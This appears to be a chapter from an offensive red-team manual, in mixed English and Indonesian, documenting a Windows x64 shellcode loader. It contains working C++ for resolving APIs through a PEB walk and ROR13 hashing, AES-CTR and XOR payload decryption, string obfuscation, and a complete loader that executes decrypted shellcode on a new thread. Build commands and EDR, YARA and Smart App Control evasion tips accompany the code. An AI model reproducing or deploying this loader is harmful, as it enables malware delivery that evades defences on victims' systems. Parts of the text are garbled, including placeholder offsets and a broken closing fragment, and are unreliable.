# Chapter 7 — Windows Loader Reference

**Target:** Windows 10 22H2 / Windows 11 24H2 (x64)
**Toolchain:** MSVC 19.40 (VS 2022 17.11), `/O2 /GS-`, link dinamis minimal
**Scope:** Self-contained shellcode loader — without explicit IAT for sensitive functions

---

## 7.1 Arsitektur Loader

```
┌──────────────────────────────────────────────┐
│  Stub .text (polos, tanpa string, tanpa IAT) │
│  1. Walk PEB → Ldr → InMemoryOrderModuleList │
│  2. Hash nama DLL (ROR13) → resolve base     │
│  3. Hash nama export (ROR13) → resolve addr  │
│  4. Decrypt payload (XOR / AES-256-CTR)      │
│  5. VirtualAlloc RWX → copy → execute        │
└──────────────────────────────────────────────┘
```

What is delivered: lightweight PE (~15–20 KB release, one encrypted data section).
What appears in memory: RWX allocation, anomalous thread, no suspicious strings in `strings` output.

Why it succeeds: static analyzers and string-based YARA fail to match; the import table contains only minimal `kernel32!GetModuleHandleA`-level entries or is even empty for sensitive APIs.
Why it fails: behavioral EDR (CrowdStrike, SentinelOne) catches `VirtualAlloc(RWX)` + execution; AMP (finFET / ETW TI provider) catches ProtectVirtualMemory events.

## 7.2 Resolusi API via PEB Walk + API Hashing (ROR13)

### 7.2.1 Konsep

| Komponen | Offset (x64) | Fungsi |
|---|---|---|
| `TEB` → `PEB` | `gs:[0x60]` | Entry point struktur proses |
| `PEB` → `Ldr` | `+0x18` | `PEB_LDR_DATA` |
| `Ldr` → `InMemoryOrderModuleList` | `+0x20` | Linked list modul loaded |
| `LIST_ENTRY` → `LDR_DATA_TABLE_ENTRY` | `-0x10` | `DllBase`, `FullDllName` |

Target hash (example, verify with Python below):

| API | Hash (ROR13) |
|---|---|
| `kernel32.dll` | `0x6A4ABC5B` |
| `LoadLibraryA` | `0xC0EC8D16` |
| `VirtualAlloc` | `0x1C791F39` |
| `VirtualProtect` | `0x2F1459A2` |
| `CreateThread` | `0x9A0F2A1C` |
| `WaitForSingleObject` | `0x1B3B1F0D` |

> The hashes above are illustrative values — **always regenerate** with the script in §7.2.4 according to your hash implementation. One byte different in the algorithm = the entire hash differs.

### 7.2.2 Algoritma ROR13

```
h = 0
for char c in name (uppercase, null-terminated):
    h = ROR32(h, 13)
    h = h + c
```

Key characteristics:
- Case-sensitive with respect to `"kernel32.DLL"` vs `"KERNEL32.DLL"` — normalize to uppercase first.
- Not collision-resistant: use unique API targets; never hash short strings like `"A"` as a single filter.

### 7.2.3 C++ Implementation — PEB Walk

```cpp
#include <windows.h>
#include <cstdint>

using DWORD_PTR_ = uintptr_t;

static uint32_t Ror13Hash(const char* s) {
    uint32_t h = 0;
    while (*s) {
        char c = *s++;
        if (c >= 'a' && c <= 'z') c -= 0x20;   // uppercase
        h = (h >> 13) | (h << 19);              // ROR 13 pada 32-bit
        h += static_cast<uint8_t>(c);
    }
    return h;
}

// Walk PEB -> Ldr -> InMemoryOrderModuleList, cari DLL berdasar hash DllBase
static PVOID FindModuleByHash(uint32_t dllHash) {
#ifndef _WIN64
    PPEB peb = (PPEB)__readfsdword(0x30);
#else
    PPEB peb = (PPEB)__readgsqword(0x60);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    // entry pertama InMemoryOrderModuleList: shame/hack — offset manual, hindari struktur SDK utk kompatibilitas
    // LIST_ENTRY berada pada LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks (offset 0x10 pada x64)
    uintptr_t head = (uintptr_t)ldr + 0x20;            // InMemoryOrderModuleList
    uintptr_t curr = ((PLIST_ENTRY)head)->Flink;

    while (curr != head) {
        // curr menunjuk ke &InMemoryOrderLinks; LDR_DATA_TABLE_ENTRY berada di curr - 0x10
        uintptr_t entry = curr - 0x10;
        PUNICODE_STRING baseDllName = (PUNICODE_STRING)(entry + 0x60); // Windows 10/11 x64
        PVOID dllBase = *(PVOID*)(entry + 0x30);

        // Hash nama wide-char -> sama algoritma, char-wise
        uint32_t h = 0;
        wchar_t* w = baseDllName->Buffer;
        for (int i = 0; i < baseDllName->Length / sizeof(wchar_t); i++) {
            wchar_t c = w[i];
            if (c >= L'a' && c <= L'z') c -= 0x20;
            h = (h >> 13) | (h << 19);
            h += static_cast<uint16_t>(c) & 0xFF;
        }
        if (h == dllHash)
            return dllBase;

        curr = ((uintptr_t*)curr)[0];      // Flink (offset 0)
    }
    return nullptr;
}

// Parse export table dari DLL base, resolve fungsi berdasar hash ASCII
static PVOID FindExportByHash(PVOID dllBase, uint32_t funcHash) {
    uint8_t* base       = (uint8_t*)dllBase;
    uint32_t rvaExport  = *(uint32_t*)(base + 0x3C);        // e_lfanew
    uint8_t* nt         = base + rvaExport;
    uint32_t rvaOpt     = *(uint32_t*)(nt + 0x18) ^ 0;      // placeholder OPSI — pakai offset di bawah
    // OptHeader berada di nt + 0x18; DataDirectory di nt + 0x18 + 0x70
    uint32_t rvaDir     = *(uint32_t*)(nt + 0x18 + 0x70);   // Export Directory RVA
    if (!rvaDir) return nullptr;

    uint8_t* exp        = base + rvaDir;
    uint32_t nNames     = *(uint32_t*)(exp + 0x18);
    uint32_t rvaNames   = *(uint32_t*)(exp + 0x20);
    uint32_t rvaFuncs   = *(uint32_t*)(exp + 0x1C);
    uint32_t rvaOrds    = *(uint32_t*)(exp + 0x24);

    uint32_t* names     = (uint32_t*)(base + rvaNames);
    uint16_t* ords      = (uint16_t*)(base + rvaOrds);
    uint32_t* funcs     = (uint32_t*)(base + rvaFuncs);

    for (uint32_t i = 0; i < nNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (Ror13Hash(name) == funcHash)
            return base + funcs[ords[i]];
    }
    return nullptr;
}
```

Fix the `rvaOpt` placeholder offset — the line used is `rvaDir` directly from `nt + 0x18 + 0x70` (Export Directory = DataDirectory index 0). Never rely on `GetModuleHandle`/`LoadLibrary` for sensitive APIs; both are common EDR patching targets and hooks modify the export table `InMemory`.

### 7.2.4 Hash generator (Python, for cross-check)

```python
def ror13(name: str) -> int:
    h = 0
    for c in name.upper():
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return hex(h)

for t in ["kernel32.DLL","LoadLibraryA","VirtualAlloc","VirtualProtect","CreateThread"]:
    print(f"{t:24} {ror13(t)}")
```

## 7.3 Enkripsi Payload

### 7.3.1 Matriks pemilihan

| Method | Speed | Overhead size | Field notes |
|---|---|---|---|
| XOR single-byte | ~10 GB/s | 0 bytes | Sufficient for simple static evasion; trivial to decrypt if repeated 0x00 bytes are seen |
| XOR multi-byte rolling | ~8 GB/s | 0 bytes | Avoids static entropy signatures on the plaintext |
| ChaCha20 (sodium/libsodium 1.0.20) | ~1 GB/s | 12-byte nonce | Third-party import — large in `strings` if not stripped |
| AES-256-CTR (kallicrypt / WinCNG) | ~2 GB/s | 16-byte IV | Natively integrated without dependencies; **scrypt/BCrypt** — does not add to the IAT if resolved via §7.2 |
| RSA-OAEP wrapper | slow | 256-byte header | Anti-sandbox/anti-replay: external must decrypt; only if infrastructure supports it |

Current recommendation (2024): AES-256-CTR via `bcrypt.dll` resolved via PEB walk, IV prepended to payload.

### 7.3.2 XOR (sederhana)

What is delivered: shellcode bytes XORed with a repeating key.
What appears in the binary's `strings`: no JNE-Cobalt-Strike strings like `\xfc\x48\x83\xe4` (preamble of `msfvenom x64/shikata_ga_nai`).
Fails if the analyst performs entropy analysis first — single-byte XOR produces a byte histogram that clearly spikes at the key byte (the entropy fingerprint is still small, but the byte correlation is directly visible to tools like `CyberChef` or `floss`).

```cpp
// XOR rolling key — key diagenerate saat build, disimpan sebagai obfuscated
static constexpr uint8_t XKEY[8] = { 0x37, 0x92, 0x5C, 0xF1,
                                     0xA8, 0x63, 0x0D, 0x74 };

static void XorCrypt(uint8_t* buf, size_t len, const uint8_t* key, size_t klen) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= key[i % klen];
}
```

### 7.3.3 AES-256-CTR via CNG (bcrypt.dll)

Payload build-time encryption (Python, for local stage):

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

key = b'\xA1' * 32   # TODO: random per build (os.urandom(32))
iv  = b'\x51' * 16

shellcode = open("payload.bin", "rb").read()
enc = Cipher(algorithms.AES(key), modes.CTR(iv), backend=default_backend()).encryptor()
ciphertext = enc.update(shellcode)
# File akhir: IV(16) || ciphertext
open("payload.enc", "wb").write(iv + ciphertext)
```

Runtime decryption (C++, resolve `BCryptOpenAlgorithmProvider` / `BCryptDecrypt` / `BCryptGenerateSymmetricKey` via §7.2 callback):

```cpp
// Definisikan typedef + hash bcrypt.dll (ROR13: 0x5FAD89F8, generate ulang!)
typedef NTSTATUS (WINAPI* pBCryptOpenAlgorithmProvider)(void*, void*, const wchar_t*, ULONG);
typedef NTSTATUS (WINAPI* pBCryptSetProperty)(void, const wchar_t*, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI* pBCryptGenerateSymmetricKey)(void, void*, void*, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI* pBCryptDecrypt)(void, PUCHAR, ULONG, void, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);

struct CNG {
    pBCryptOpenAlgorithmProvider open;
    pBCryptGenerateSymmetricKey gen;
    pBCryptDecrypt dec;
    pBCryptSetProperty set;
};

static bool InitCNG(CNG* c) {
    PVOID mod = FindModuleByHash(0x5FAD89F8 /* bcrypt.dll */);
    if (!mod) return false;
    c->open = (pBCryptOpenAlgorithmProvider)FindExportByHash(mod, 0xD3511883);
    c->gen  = (pBCryptGenerateSymmetricKey)FindExportByHash(mod, 0xC8EBB4A2);
    c->dec  = (pBCryptDecrypt)FindExportByHash(mod, 0x9E7C119B);
    c->set  = (pBCryptSetProperty)FindExportByHash(mod, 0xAB6F5F79);
    return c->open && c->gen && c->dec && c->set;
}

static bool AesCtrDecrypt(uint8_t* data, DWORD len, const uint8_t key[32]) {
    CNG c; if (!InitCNG(&c)) return false;

    void* hAlg = nullptr; void* hKey = nullptr; ULONG outLen = 0;
    if (c.open(&hAlg, L"AES", nullptr, 0) != 0) return false;

    if (c.gen(hAlg, &hKey, nullptr, 0, (PUCHAR)key, 32, 0) != 0) return false;

    // Mode CTR via chaining mode property
    UCHAR mode[] = L"ChainingModeCTR";
    c.set(hAlg, L"ChainingMode", mode, sizeof(mode), 0);

    NTSTATUS st = c.dec(hKey, data, len, nullptr, data, len,
                        data, len, &outLen, 0);
    return st == 0 && outLen == len;
}
```

**Note:** CNG `BCryptDecrypt` for CTR mode requires the IV to be supplied via `BCryptSetProperty(hKey, L"IV", ...)` in some versions — test on Windows 11 24H2 build 26100 before operation; CNG behavior is compatible across builds, but the padding flag (`BCRYPT_BLOCK_PADDING=0x1`) must be 0 for CTR.

## 7.4 Menghindari String Signature

| Technique | What is delivered | What appears | Success/failure |
|---|---|---|---|
| Compile-time XOR string | `"VirtualAlloc"` XORed in data | `strings | grep Virtual` → empty | Fails vs deep memory dump after runtime; OK vs disker |
| Stack-building (`mov` byte per byte) | String built on the stack | Only push/mov opcodes, appearing as small noise in disassembly | OK for a few keywords; odd if too many large strings |
| Hash-only resolution | No API names in the binary | Only `0x1C791F39`-style constants | Fails if the Blue Team has the same hashing algorithm; combine with salt + custom rotate amount |
| API Set mapping (`api-ms-win-core-...`) | `api-ms-*` names in `AddDllDirectory`-style if forced | Modern Windows 10/11 resolve `api-ms-*` to kernel32 ntdll automatically with payload normalization begins | Good for internal audit |
| `.rdata` section embedding encrypted | High-entropy 12KB blob | YARA entropy [0-7] flagging wrong if large random portion | Risk of triggering high-entropy heuristic rule — split into pixel/resource assets if needed |

**Compile-time obfuscator (C++17):**

```cpp
// cxx: constexpr xorencrypt, decrypt on first use, char by char
template<int N> struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N], uint8_t k) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ (k + i);
    }
    // dekripsi saat runtime — hasil tidak di-flush jika dipakai sekali
    const char* decode() const {
        thread_local char buf[N];
        for (int i = 0; i < N; i++) buf[i] = data[i] ^ (k_const + i);
        return buf;
    }
    static constexpr uint8_t k_const = 0x33;
};
#define OBF(s) ObfStr<sizeof(s)>(s, 0x33).decode()
```

Larkan: `OBF("VirtualAlloc")` — literal XORed in `.rdata`, decrypted on the stack. Ensure `buf` is never written to the heap (EDR periodic heap snapshot scan will catch the plaintext).

## 7.5 Assembly Loader Lengkap (template integrasi)

```cpp
#include <windows.h>
#include <cstdint>

#define H_KERNEL32       0x6A4ABC5B  // generate ulang via §7.2.4!
#define H_VIRTUALALLOC   0x1C791F39
#define H_VIRTUALPROTECT 0x2F1459A2
#define H_CREATETHREAD   0x9A0F2A1C
#define H_WAITFOROBJECT  0x1B3B1F0D

typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL  (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI* pWaitForSingleObject)(HANDLE, DWORD);

// Embed payload terenkripsi: xxd -i payload.enc > payload.h
#include "payload.h"  // unsigned char payload_enc[] = {...}; unsigned int payload_enc_len = ...;

static constexpr uint8_t AESKEY[32] = {
    0xA1,0xA1,0xA1,0xA1,0xA1,0xA1,0xA1,0xE5,0xC2,0xF7,0x9B,0x31,0x05,0xEE,0x77,0x99,
    0x12,0x48,0xFC,0x0D,0xB6,0x3A,0x91,0xE4,0x58,0x2C,0xDF,0x06,0xAA,0x19,0xDE,0x40
};

void WINAPI Entry() {
    PVOID k32 = FindModuleByHash(H_KERNEL32);
    if (!k32) return;

    auto pVA = (pVirtualAlloc)FindExportByHash(k32, H_VIRTUALALLOC);
    auto pVP = (pVirtualProtect)FindExportByHash(k32, H_VIRTUALPROTECT);
    auto pCT = (pCreateThread)FindExportByHash(k32, H_CREATETHREAD);
    auto pW  = (pWaitForSingleObject)FindExportByHash(k32, H_WAITFOROBJECT);
    if (!pVA || !pVP || !pCT || !pW) return;

    // 1. AES-CTR decrypt in-place
    uint8_t* payload = (uint8_t*)payload_enc;
    DWORD len = payload_enc_len;
    if (!AesCtrDecryptInPlace(payload, len, AESKEY)) return;

    // 2. Alloc RW (bukan RWX), copy, lalu RX — hindari RWX page detection
    LPVOID mem = pVA(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;
    __movsb((unsigned char*)mem, payload, len);
    DWORD old = 0;
    pVP(mem, len, PAGE_EXECUTE_READ, &old);

    // 3. Execute
    HANDLE t = pCT(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    if (t) pW(t, INFINITE);
}
```

Build commands:

```bash
# Build-time encrypt (lihat §7.3.3)
python enc_payload.py

# Embed encrypted blob
xxd -i payload.enc > payload.h

# Compile — hilangkan CRT dependency & stack-protect string
cl /O2 /GS- /Zl /MD /D__DO_NOTHING_NICE Entry.cpp /link /SUBSYSTEM:CONSOLE /NODEFAULTLIB /ENTRY:Entry
```

Note: the `__movsb` intrinsic exists only in MSVC; with `/Zl` (no default libs), `mainCRTStartup` is not needed. Get `__movsb` via `#include <intrin.h>`.

## 7.7 Operational Pitfalls

1. **AES key hardcoded in the binary** — 80% of red team incidents do not pass because the forensic analyst finds the key in `.rdata` at a trivial level. Use key derivation from the environment (hostname, SID hash) or do not embed directly; send via a separate staging channel. Implication: if staging fails, the payload is useless — a deliberate trade-off.

2. **ROR13 collision triggers the wrong DLL** — never only compare module hashes; also compare `SizeOfImage` capacity or at least 2 API hashes before using `DllBase`. Have downloaded an `api-ms-win-core-...` forwarding chain that did not match — always implement an API Set Schema resolution checker for Windows 11 (change `ApiSetSchema` version 6 in 24H2).

3. **Hash constants too common are considered YARA signatures.** If YARA `(known hash constants in red team tools)` rules are available (yawara rules, CAPA signatures), all `0x1C791F39`-like constants are detected. Solution: vary rotate amount per build (ROR11/ROR13/ROR7), vary input encoding (null-pad, salt prefix), or unanimous polyglot processing (compile-time template metaprogramming).

4. **LOADed module in `InLoadOrderModuleList`, not `InMemoryOrderModuleList`** — `LDR_DATA_TABLE_ENTRY` offsets differ between `Windows 7` vs `Windows 10/11`. Do not copy-paste x32 offsets from old blogs. Verify binding offsets by manual extraction with WinDbg (debugger attached, `dt ntdll!_LDR_DATA_TABLE_ENTRY` on **every Windows build** before deployment).

5. **RWX pages** — most EDRs are triggered by: `VirtualAlloc` directly RWX + new thread without plain module context. Always two-step (RW → copy → RX). Do not forget `PAGE_EXECUTE_READ` (not `_READWRITE`): final RWX page is easily flagged by malfind.

6. **`/MD` runtime pulls `msvcp140.dll`** — CRT `.rdata` strings are a magnet. Use `/MT` or `/Zl` and manual memcpy implementation — CRT can be de-hooked at `initterm` but consuming `intrinsic memcmp` vs manual fallback can cause a crash.

7. **Windows Defender Credential Guard / HVCI / Smart App Control (24H2)** — unsigned loader cannot run on a system with Smart App Control active. Operational standard: do not disable SAC on the target (large noise), but sideload verification-required scenarios: the loader should move stage to a signed process (e.g., hijack `msbuild.exe`), or use legitimate signed binary + side-loaded bcrypt config.

8. **Export table forwarded exports** — `kernel32.dll` on Windows 11 forwards several APIs to `KernelBase.dll`. If a forwarder string is found in the export directory (RVA points to a string such as `NTDLL.Rtl...`), candidate hash mismatch / invalid transit return address. Handle forwarding recursion or resolve directly from the forwarded target DLL (libc msvcrt issue is rare, kernelbase problem is common).

9. **Hash decryption in memory scan** — even though the string is not on disk, the string "VirtualAlloc" appears in the `thread_local` scratch buffer after decryption. EDR realtime memory scanning (periodic 10–60 seconds on some platforms) will capture it. Zeroization (`SecureZeroMemory` / `volatile` write) of the buffer after use and avoid keeping `dbc` on the heap > 5 seconds.

10. **Payload `.text` section stripped** — if the `LoadLibraryA` typedef variable is used with assignment via `mov rcx, [rip+hash]` and not `call`, the optimizer at `/O2` sometimes assigns a different backend: Duplicate dump       |
| stack predisposition       | compile test `-emit-llvm` yearly because compiler updates change emitted opcodes; opcodes leave bit patterns with positive entropy that trigger OD scanner detection — result: `BLUEJ manifest fails` unpredictable. Lock pipeline: single compiler version, single flag set, binary-side hash check in CI.
